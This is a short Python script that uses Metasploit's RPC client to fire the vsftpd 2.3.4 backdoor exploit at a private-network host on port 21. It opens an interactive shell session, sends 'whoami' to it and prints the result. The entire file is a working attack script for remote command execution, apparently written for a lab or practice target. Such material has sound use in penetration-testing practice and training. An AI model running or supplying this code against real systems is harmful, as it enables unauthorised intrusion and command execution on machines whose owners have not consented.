import os
from metasploit.msfrpc import *

client = MsfRpcClient('mypassword')

exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')

exploit['RHOST'] = "192.168.115.80"
exploit['RPORT'] = "21"

exploit.execute(payload="cmd/unix/interact")

print("Sessions avaiables : ")
for s in client.sessions.list.keys():
	print(s)

shell = client.sessions.session(list(client.sessions.list.keys())[0])

shell.write('whoami\n')

print(shell.read())

# shell.stop()

os.system("py3clean .")